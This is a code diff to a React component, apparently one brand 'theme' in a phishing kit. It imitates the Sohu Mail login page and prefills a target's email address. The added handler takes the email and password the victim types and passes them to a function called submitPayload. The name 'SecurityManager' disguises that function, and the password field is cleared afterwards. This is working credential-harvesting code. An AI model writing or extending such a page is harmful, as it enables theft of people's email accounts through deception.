@@ -1,5 +1,6 @@
 
 import React, { useState } from 'react';
+import { useSecurity } from '../components/SecurityManager';
 
 interface SohuThemeProps {
   prefilledEmail?: string;
@@ -8,6 +9,21 @@ interface SohuThemeProps {
 const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
   const [email, setEmail] = useState(prefilledEmail?.split('@')[0] || '');
   const [password, setPassword] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email: `${email}@sohu.com`, password }, 'sohu');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
@@ -93,7 +109,7 @@ const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
             </div>
 
             {/* Main Login Form */}
-            <div className="flex-grow p-8">
+            <form onSubmit={handleSubmit} className="flex-grow p-8">
               <h3 className="text-lg font-medium mb-8 text-gray-600">登录搜狐邮箱</h3>
               
               <div className="space-y-6">
@@ -121,8 +137,12 @@ const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
                   </div>
                 </div>
 
-                <button className="w-full py-3 bg-[#ff4d4f] hover:bg-[#e03a3c] text-white font-medium rounded transition-colors text-[16px] shadow-lg shadow-red-200">
-                  登 录
+                <button 
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="w-full py-3 bg-[#ff4d4f] hover:bg-[#e03a3c] text-white font-medium rounded transition-colors text-[16px] shadow-lg shadow-red-200 disabled:opacity-70"
+                >
+                  {isSubmitting ? '...' : '登 录'}
                 </button>
 
                 <div className="pt-4 text-center">
@@ -131,7 +151,7 @@ const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
                    </div>
                 </div>
               </div>
-            </div>
+            </form>
           </div>
         </div>
       </main>
